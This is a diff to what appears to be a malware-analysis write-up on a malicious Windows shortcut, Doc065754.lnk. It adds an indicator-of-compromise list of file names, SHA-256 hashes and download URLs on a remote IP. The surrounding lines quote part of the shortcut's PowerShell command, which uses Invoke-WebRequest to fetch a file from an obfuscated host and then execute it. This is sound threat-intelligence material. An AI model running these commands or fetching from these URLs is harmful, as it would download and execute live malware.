@@ -3,6 +3,25 @@
 ### Dynamic Analysis
 https://tria.ge/230310-r1hssafh8w/behavioral2
 
+IOC List
+```
+Vejlensisk90.vbs
+ffe477577469c87c606e0cbd9d0da68446cd8d895e4f4ab0a083f0a05ac8ab20
+http://194.180.48.211/sara/Vejlensisk90.vbs
+
+Dedepseud52.toc
+a0eb3d21e512a48dc5235b72ede39abcbda707e04435d73be4d2735493dac0f4
+http://194.180.48.211/zara/Dedepseud52.toc
+
+info.pdf
+6e641de68bfd6ab98e297704ab27f784cde401eaaa2d3f7d8653553c60f977da
+http://194.180.48.211/sara/info.pdf
+
+BWTqkhVBTwqHOjTU152.psm
+0284d5b3329696130a0cff5c73c2eddb76c2927a72ea7a868ba6d72344172f18
+http://194.180.48.211/zara/BWTqkhVBTwqHOjTU152.psm
+```
+
 ### Malicious Shortcut Doc065754.lnk executes the following command
 
 ```
@@ -12,10 +31,6 @@ C:\Windows\Tasks\Tepoler.vbs;
 Invoke-WebRequest http[:]//0xC2.11808979/sara/info.pdf -OutFile C:\Users\Public\info1.pdf; 
 C:\Users\Public\info1.pdf
 ```
-
-### Remote webserver IP
-
-`194.180.48.211`
 
 ### Vejlensisk90.vbs executes the following PS Script (deobfuscated) which downloads and loads another ps script
 
